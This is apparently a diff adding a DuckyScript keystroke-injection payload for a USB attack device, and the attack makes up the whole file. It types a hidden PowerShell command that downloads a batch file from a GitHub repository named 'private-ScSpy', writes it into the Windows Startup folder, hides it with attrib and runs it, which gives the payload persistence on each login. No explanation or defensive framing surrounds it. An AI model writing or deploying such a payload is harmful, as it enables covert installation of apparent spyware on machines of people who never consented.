@@ -1,0 +1,9 @@
+GUI r
+DELAY 150
+STRING cmd
+DELAY 50
+ENTER
+DELAY 1000
+STRING powershell -w h -c "$p = \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\temp.bat\"; iwr https://raw.githubusercontent.com/6E65787371/private-ScSpy/main/temp.bat -OutFile $p; attrib +h $p; ii $p" & exit
+DELAY 50
+ENTER
